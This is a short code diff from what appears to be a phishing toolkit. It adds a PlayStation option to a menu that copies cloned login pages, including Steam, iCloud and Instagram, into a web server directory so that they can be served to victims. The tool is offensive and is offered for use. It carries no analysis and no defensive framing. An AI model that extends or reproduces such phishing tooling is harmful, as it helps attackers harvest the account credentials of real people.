@@ -65,6 +65,8 @@ def runPhishing(page , customOption): #Phishing pages selection menu
         copy_tree("WebPages/steam/", "Server/www/")
     elif page == 'iCloud':
         copy_tree("WebPages/iCloud/", "Server/www/")
+    elif page == 'Playstation':
+        copy_tree("WebPages/playstation", "Server/www/")
     elif customOption == '1' and page == 'Instagram':
         copy_tree("WebPages/Instagram_web/", "Server/www/")
     elif customOption == '2' and page == 'Instagram':
@@ -250,6 +252,10 @@ def runMainMenu(): #menu where user select what they wanna use
         loadModule('iCloud')
         customOption = ''
         runPhishing('iCloud', customOption)
+    elif option == '16':
+        loadModule('Playstation')
+        customOption = ''
+        runPhishing('Playstation', customOption)
     else:
         exit(0)
 
